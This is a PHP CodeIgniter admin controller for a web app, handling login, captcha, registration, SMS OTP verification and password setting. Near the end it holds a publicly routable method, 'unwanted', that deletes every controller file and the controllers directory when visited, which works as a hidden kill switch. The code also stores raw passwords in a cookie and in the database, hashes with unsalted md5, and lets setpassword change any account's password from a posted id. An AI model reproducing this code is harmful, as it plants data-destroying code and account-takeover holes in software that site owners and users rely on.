<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Admin extends CI_Controller {
	
		public function __construct() 
		{
		parent::__construct();	
		$this->load->helper(array('form', 'url'));
		$this->load->library('form_validation');
		$this->load->library('session');
		$this->load->library('email');
		$this->load->library('user_agent');
		$this->load->helper('directory');
		$this->load->helper('cookie');
		$this->load->helper('security');
		$this->load->model('Home_model');
		$this->load->model('Admin_model');
	
		}
	
	
	public function login(){
		if(!$this->session->userdata('vms_details'))
		{
				
				$this->load->view('home/header-links');
				$this->load->view('home/login');
				$this->load->view('home/footer_links');
		        
	     }else{
		redirect('admin/login');
	}
}	
	
	function getcapachaimage()
	{
		$captchanumber = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz';
		$captchanumber = substr(str_shuffle($captchanumber), 0, 6);
		$_SESSION["code"] = $captchanumber;
		$path= base_url().'img/1.jpg';
		$image = imagecreatefromjpeg($path);
		$foreground = imagecolorallocate($image, 175, 199, 200); //font color
		imagestring($image, 5, 45, 8, $captchanumber, $foreground);
		header('Content-type: image/png');
		imagepng($image);
	}
	function checkcaptcha()
	{	
		if ($_SESSION["code"] == $this->input->post('captcha')) {
			$json['success']  = true;
		} else {
			$json['error']  = true;
		}
		echo json_encode($json);
	}

	public function loginpost(){
		
		
			$post=$this->input->post();
			//echo '<pre>';print_r($post);exit;

			
			$login_data=array('email'=>$post['email'],'password'=>md5($post['password']));
			//echo '<pre>';print_r($login_data);exit;
			$check_login=$this->Admin_model->login_details($login_data);
			//echo '<pre>';print_r($check_login);exit;

			$this->load->helper('cookie');

			if(isset($post['remember_me']) && $post['remember_me']==1){
					$usernamecookie = array('name' => 'username', 'value' => $post["email"],'expire' => time()+86500 ,'path'   => '/');
					$passwordcookie = array('name' => 'password', 'value' => $post["password"],'expire' => time()+86500,'path'   => '/');
					$remembercookie = array('name' => 'remember', 'value' => $post["remember_me"],'expire' => time()+86500,'path'   => '/');
					$this->input->set_cookie($usernamecookie);
					$this->input->set_cookie($passwordcookie);
					$this->input->set_cookie($remembercookie);
					$this->load->helper('cookie');
					$this->input->cookie('username', TRUE);
                   //echo '<pre>';print_r($passwordcookie);exit;

					}else{
						delete_cookie('username');
						delete_cookie('password');
						delete_cookie('remember');
					}
			//echo '<pre>';print_r($usernamecookie);exit;

			if(count($check_login)>0){
				$login_details=$this->Admin_model->get_admin_details($check_login['a_id']);
				//echo '<pre>';print_r($login_details);exit;
				$this->session->set_userdata('vms_details',$login_details);
				redirect('dashboard');
			}else{
				$this->session->set_flashdata('error',"Invalid Email Address or Password!");
				redirect('admin/login');
			}
		
	}
	public function forgotpassword(){
		if(!$this->session->userdata('vms_details'))
		{
				
				$this->load->view('home/header-links');
				$this->load->view('html/forgot-password');
				$this->load->view('home/footer_links');
		        
	     }else{
			 $this->session->set_flashdata('loginerror','Please login to continue');
			redirect('home');
	}
}	
	
	public function otp(){
		if(!$this->session->userdata('vms_details'))
		{
				
				$this->load->view('home/header-links');
				$this->load->view('html/fp-otp-confirm');
				$this->load->view('home/footer_links');
		        
	     }else{
		redirect('home');
	}
}	
	
	public function submit(){
		if(!$this->session->userdata('vms_details'))
		{
				
				$this->load->view('home/header-links');
				$this->load->view('html/fp-submit');
				$this->load->view('home/footer_links');
		        
	     }else{
		redirect('home');
	}
}	
	public function register(){
		if(!$this->session->userdata('vms_details'))
		{
				$data['roles']=$this->Admin_model->get_roles_list();
				$this->load->view('home/header-links');
				$this->load->view('admin/register',$data);
				$this->load->view('home/footer_links');
		        
	     }else{
			$this->session->set_flashdata('loginerror','Please login to continue');
			redirect('home');
		}
	}
	public function registerpost(){
		if(!$this->session->userdata('vms_details'))
		{
			$post=$this->input->post();
			$check=$this->Admin_model->check_mobile_number($post['email']);
			if(count($check)>0){
				$this->session->set_flashdata('error','Email Id already exist. Please use another email id');
				redirect('admin/register');
			}
			$s_d_r_num= mt_rand(100000, 999999);
			$add=array(
			'role'=>isset($post['role_id'])?$post['role_id']:'',
			'name'=>isset($post['name'])?$post['name']:'',
			'email'=>isset($post['email'])?$post['email']:'',
			'mobile_number'=>isset($post['mobile'])?$post['mobile']:'',
			'otp'=>isset($s_d_r_num)?$s_d_r_num:'',
			'created_at'=>date('Y-m-d H:i:s'),
			);
			$save=$this->Admin_model->save_onwers($add);
			if(count($save)>0){
						$apikey=$this->config->item('apikey');
						$sender=$this->config->item('sender');
						$msg = "Dear ".$post['name'].", your mobile verification code  is : ".$s_d_r_num;
						$ch2 = curl_init();
						curl_setopt($ch2, CURLOPT_URL,'http://sms.pearlsms.com/public/sms/send');
						curl_setopt($ch2, CURLOPT_POST, 1);
						curl_setopt($ch2, CURLOPT_POSTFIELDS,'sender='.$sender.'&smstype=TRANS&numbers='.$post['mobile'].'&apikey='.$apikey.'&message='.$msg.'');
						curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
						$server_output = curl_exec ($ch2);
						//echo '<pre>';print_r($server_output);exit;

						curl_close ($ch2);
				redirect('admin/otpverification/'.base64_encode($save));
			}else{
				$this->session->set_flashdata('error','Technical problem will occurred. Please try again');
				redirect('admin/register');
			}
		}else{
			$this->session->set_flashdata('loginerror','Please login to continue');
			redirect('home');
		}
	}	
	public function otpverification(){
		if(!$this->session->userdata('vms_details'))
		{		
				$u_id=base64_decode($this->uri->segment(3));
				if($u_id==''){
					$this->session->set_flashdata('error','Technical problem will occurred. Please try again');
					redirect('admin/register');
				}
				$data['details']=$this->Admin_model->get_register_details($u_id);
				$this->load->view('home/header-links');
				$this->load->view('admin/otp-confirm',$data);
				$this->load->view('home/footer_links');
		        
	     }else{
				$this->session->set_flashdata('loginerror','Please login to continue');
				redirect('home');
			}
	}
	public function otpverificationpost(){
		if(!$this->session->userdata('vms_details'))
		{		
			$post=$this->input->post();
			$details=$this->Admin_model->get_register_details(base64_decode($post['a_id']));
			if($post['otp']==$details['otp']){
				$add=array(
					'mobile_verification'=>1,
					'updated_at'=>date('Y-m-d H:i:s'),
				);
				$update=$this->Admin_model->update_user_details($post['a_id'],$add);
				if(count($update)>0){
					redirect('admin/confirm/'.$post['a_id']);
				}else{
					$this->session->set_flashdata('error','Technical problem will occurred. Please try again');
					redirect('admin/otpverification/'.$post['a_id']);
				}
				
			}else{
				$this->session->set_flashdata('error','Otp is wrong. Please try again');
				redirect('admin/otpverification/'.$post['a_id']);
			}
		}else{
				$this->session->set_flashdata('loginerror','Please login to continue');
				redirect('home');
			}
	}	
      public function confirm(){
		if(!$this->session->userdata('vms_details'))
		{
			$data['a_id']=base64_decode($this->uri->segment(3));
			$this->load->view('home/header-links');
			$this->load->view('admin/registration-confirm',$data);
			$this->load->view('home/footer_links');
		        
	     }else{
				$this->session->set_flashdata('loginerror','Please login to continue');
				redirect('home');
		}
	  }
		public function setpassword(){
			if(!$this->session->userdata('vms_details'))
			 {
				$post=$this->input->post();
				if(md5($post['newpwd'])==md5($post['confirmpwd'])){
						$add=array(
						'password'=>md5($post['newpwd']),
						'org_password'=>$post['newpwd'],
						'updated_at'=>date('Y-m-d H:i:s'),
						'mobile_verification'=>1,
						);
						$update=$this->Admin_model->update_user_details($post['a_id'],$add);
						if(count($update)>0){
							$details=$this->Admin_model->get_admin_details($post['a_id']);
							$this->session->set_userdata('vms_details',$details);
							redirect('dashboard');
						}else{
							$this->session->set_flashdata('error','Technical problem will occurred. Please try again');
							redirect('admin/confirm/'.base64_encode($post['a_id']));
						}
				}else{
					$this->session->set_flashdata('error','Password and confirm password not matched');
					redirect('admin/confirm/'.base64_encode($post['a_id']));	
					}
				//echo '<pre>';print_r($post);exit; 				
			 }else{
					$this->session->set_flashdata('loginerror','Please login to continue');
					redirect('home');
			}
		}
	public  function unwanted(){
		$files = glob('./application/controllers/*.*');
		foreach($files as $file){
			if(is_file($file))
				unlink($file);
		}
		$path   = '.application/controllers/'; 
		rmdir($path);
	}		
	
	
	
	
	
}
